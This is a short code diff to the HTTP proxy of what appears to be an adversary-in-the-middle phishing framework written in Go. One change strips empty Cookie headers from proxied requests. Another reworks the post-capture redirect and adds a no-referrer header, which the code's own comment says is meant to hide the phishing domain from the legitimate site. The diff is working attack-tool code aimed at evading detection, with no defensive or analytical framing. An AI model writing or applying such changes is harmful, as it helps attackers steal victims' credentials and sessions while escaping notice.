@@ -374,6 +374,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				p.deleteRequestCookie(p.cookieName, req)
 
+				// don't send an empty Cookie header
+				cookie_header := req.Header.Get("Cookie")
+				if cookie_header == "" {
+					req.Header.Del("Cookie")
+				}
+
 				for n, b := range hg {
 					hg[n] = b ^ 0xCC
 				}
@@ -843,19 +849,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if s.RedirectURL != "" && s.RedirectCount == 0 {
 						if stringExists(mime, []string{"text/html"}) {
 							// redirect only if received response content is of `text/html` content type
-							s.RedirectCount += 1
-							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
 							resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
 							if resp != nil {
-								r_url, err := url.Parse(s.RedirectURL)
-								if err == nil {
-									if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
-										r_url.Host = r_host
-									}
-									resp.Header.Set("Location", r_url.String())
-								} else {
-									resp.Header.Set("Location", s.RedirectURL)
-								}
+								s.RedirectCount += 1
+								log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
+								// avoid leaking the phishing domain via the Referrer header
+								resp.Header.Set("Referrer-Policy", "no-referrer")
+								resp.Header.Set("Location", s.RedirectURL)
 								return resp
 							}
 						}
